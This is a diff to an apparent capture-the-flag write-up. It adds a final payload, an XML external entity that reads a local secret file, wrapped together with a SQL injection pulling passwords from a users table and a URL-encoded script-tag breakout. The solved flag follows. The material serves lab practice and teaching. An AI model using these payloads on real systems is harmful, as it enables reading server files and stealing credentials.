@@ -224,6 +224,11 @@ let payload ="<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file
 	})
 ```
 if we run this file locally it returns true , so test is done.
+last payload --> 
+```html
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///home/gnx/script/xxe_secret">]><root><textarea>&test;</textarea><script>' UNION SELECT 1, 2 , password FROM users -- -</script><c>%3c%2f%73%63%72%69%70%74%3e%3c%73%63%72%69%70%74%3e%78%73%73%3d%31</c></root>
+```
+![Screenshot at 2021-07-21 19-18-58](https://user-images.githubusercontent.com/52857059/126531806-2a0f500d-291e-4746-be80-6a8da06ae55e.png)
 
-![Screenshot at 2021-07-21 12-50-50](https://user-images.githubusercontent.com/52857059/126530723-1d1e466b-825e-48a2-9d6b-5c0efc6d5ddc.png)
+booom flag SBCTF{It_!s_th3_FL4GSH!P!}
 
